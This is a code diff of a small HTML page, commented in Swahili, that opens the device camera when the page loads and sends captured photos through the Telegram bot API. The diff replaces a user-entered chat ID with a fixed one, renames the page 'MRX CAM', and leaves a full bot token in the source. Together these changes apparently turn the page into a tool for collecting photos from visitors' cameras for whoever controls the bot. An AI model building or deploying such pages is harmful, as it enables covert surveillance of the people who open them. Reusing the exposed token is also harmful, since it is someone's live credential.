@@ -2,12 +2,12 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Piga Picha Tuma Telegram</title>
+  <title>MRX CAM 📸</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
       margin: 0;
-      background: black;
+      background-color: black;
       color: white;
       font-family: sans-serif;
       text-align: center;
@@ -19,68 +19,63 @@
       background: #000;
     }
 
-    canvas {
-      display: none;
-    }
-
     button {
-      background: limegreen;
+      background: #28a745;
       border: none;
-      padding: 15px 25px;
-      margin: 15px;
-      font-size: 18px;
-      border-radius: 8px;
       color: white;
+      padding: 14px 25px;
+      font-size: 18px;
+      margin-top: 15px;
+      border-radius: 10px;
+      cursor: pointer;
     }
 
-    h2 {
-      margin: 10px 0;
+    #status {
+      margin-top: 15px;
+      font-weight: bold;
     }
   </style>
 </head>
 <body>
 
-  <h2>Piga Picha na Tuma kwa Telegram</h2>
-  <video id="video" autoplay playsinline></video><br>
-  <button id="capture">📸 Piga Picha</button>
-  <canvas id="canvas"></canvas>
+  <h2>MRX CAM LIVE 📷</h2>
+  <video id="video" autoplay playsinline></video>
+  <br>
+  <button id="capture">🎯 Start Camera & Send</button>
+  <p id="status"></p>
+  <canvas id="canvas" style="display: none;"></canvas>
 
   <script>
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const captureBtn = document.getElementById('capture');
+    const statusText = document.getElementById('status');
 
     const BOT_TOKEN = '8062150039:AAHmI3ra-UPWJgM01nm-jxzd0Ck2UE3vkWg';
-
-    let chatId = null;
+    const CHAT_ID = 6142705074; // ← Chat ID yako halali tayari
 
     // Fungua kamera
     navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
       .then(stream => {
         video.srcObject = stream;
+        statusText.textContent = "📡 Kamera imefunguka!";
       })
       .catch(err => {
-        alert("Imeshindikana kufungua kamera: " + err.message);
+        statusText.textContent = "❌ Kamera haikufunguka: " + err.message;
       });
 
-    // Chukua chat ID yako kwa mkono kwa sasa
-    chatId = prompt("Weka chat ID yako ya Telegram (au ya group)");
-
+    // Bonyeza button → piga picha na tuma
     captureBtn.addEventListener('click', () => {
-      if (!chatId) {
-        alert("Chat ID haijawekwa!");
-        return;
-      }
+      statusText.textContent = "⏳ Inatuma picha...";
 
-      // Tumia canvas kuchora picha
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
-      canvas.getContext('2d').drawImage(video, 0, 0);
-      
-      // Geuza kuwa image
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0);
+
       canvas.toBlob(blob => {
         const formData = new FormData();
-        formData.append('chat_id', chatId);
+        formData.append('chat_id', CHAT_ID);
         formData.append('photo', blob, 'picha.jpg');
 
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
@@ -89,10 +84,14 @@
         })
         .then(res => res.json())
         .then(data => {
-          alert("✅ Picha imetumwa kwa Telegram!");
+          if (data.ok) {
+            statusText.textContent = "✅ Picha imepelekwa Telegram!";
+          } else {
+            statusText.textContent = "❌ Error: " + JSON.stringify(data);
+          }
         })
         .catch(err => {
-          alert("❌ Imeshindikana kutuma picha: " + err.message);
+          statusText.textContent = "❌ Mtandao au bot error: " + err.message;
         });
       }, 'image/jpeg');
     });
